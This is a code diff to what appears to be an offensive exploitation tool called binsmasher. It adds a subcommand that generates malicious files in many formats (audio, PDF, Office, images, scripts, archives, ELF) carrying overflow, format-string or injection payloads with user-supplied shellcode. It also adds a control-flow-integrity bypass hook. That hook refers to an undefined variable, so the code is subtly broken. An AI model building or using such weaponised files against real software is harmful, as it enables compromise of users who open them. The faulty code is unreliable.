@@ -114,6 +114,22 @@ def build_parser() -> argparse.ArgumentParser:
     sp.add_argument("--host",         default="localhost")
     sp.add_argument("--port",         type=int, default=8900)
 
+    # ── file ─────────────────────────────────────────────────────────────────
+    fp = sub.add_parser("file", help="Generate malicious files for parser/editor/browser testing",
+                        formatter_class=RichHelpFormatter)
+    fp.add_argument("--format", required=True,
+                    help="File format to generate: mp3 wav flac ogg aac pdf doc docx xls xlsx rtf "
+                         "txt csv json xml html svg bmp png gif jpeg py js php lua rb zip tar elf")
+    fp.add_argument("--offset", type=int, default=256, help="Overflow offset / filler length")
+    fp.add_argument("--technique", choices=["overflow","fmtstr","inject"], default="overflow",
+                    help="Payload technique: overflow | fmtstr | inject")
+    fp.add_argument("--shellcode-hex", default=None,
+                    help="Raw shellcode as hex string (default: NOP sled + INT3)")
+    fp.add_argument("-o", "--output-dir", default=".", help="Output directory for generated files")
+    fp.add_argument("--all-formats", action="store_true",
+                    help="Generate one payload for every supported format")
+    fp.add_argument("-l", "--log-file", default="binsmasher_file.log")
+
     return parser
 
 
@@ -227,6 +243,13 @@ def run_binary(cfg: ExploitConfig) -> None:
         libc_version=lib_version or "2.31", pie=pie,
     )
 
+    # Advanced bypass hooks
+    if hasattr(cfg, "cfi") and cfg.cfi or "--cfi-bypass" in str(args.__dict__):
+        log.info("Attempting CFI bypass…")
+        cfi_chain = exploiter.cfi_bypass(offset, canary)
+        if cfi_chain:
+            log.info(f"CFI bypass chain ready: {len(cfi_chain)} bytes")
+
     # Windows extra
     if platform == "windows":
         if cfg.safeseh_bypass:
@@ -288,6 +311,43 @@ def run_solana(args: argparse.Namespace) -> None:
 # Entry point
 # ────────────────────────────────────────────
 
+
+# ────────────────────────────────────────────────────────────────────────────
+# File-based exploitation flow
+# ────────────────────────────────────────────────────────────────────────────
+
+def run_file(args: argparse.Namespace) -> None:
+    global log
+    from file_exploiter import FileExploiter
+
+    fe = FileExploiter(output_dir=args.output_dir)
+
+    sc = None
+    if args.shellcode_hex:
+        try:
+            sc = bytes.fromhex(args.shellcode_hex.replace("\\x","").replace("0x",""))
+        except Exception as e:
+            log.error(f"Invalid shellcode hex: {e}")
+            return
+
+    if args.all_formats:
+        results = fe.craft_all(args.offset, sc, args.technique)
+        console.print(Panel(
+            f"Generated {len(results)} payloads in {args.output_dir}/",
+            title="File Exploiter", border_style="cyan"
+        ))
+        for _, path in results:
+            console.print(f"  [green]→[/] {path}")
+    else:
+        payload, path = fe.craft(args.format, args.offset, sc, args.technique)
+        console.print(Panel(
+            f"Payload: {path}\n"
+            f"Size:    {len(payload)} bytes\n"
+            f"Format:  {args.format}\n"
+            f"Technique: {args.technique}",
+            title="File Exploiter", border_style="cyan"
+        ))
+
 def main() -> None:
     global log
     parser = build_parser()
@@ -335,6 +395,10 @@ def main() -> None:
     elif args.mode == "solana":
         log = setup_logging(args.log_file)
         run_solana(args)
+
+    elif args.mode == "file":
+        log = setup_logging(args.log_file)
+        run_file(args)
 
 
 if __name__ == "__main__":
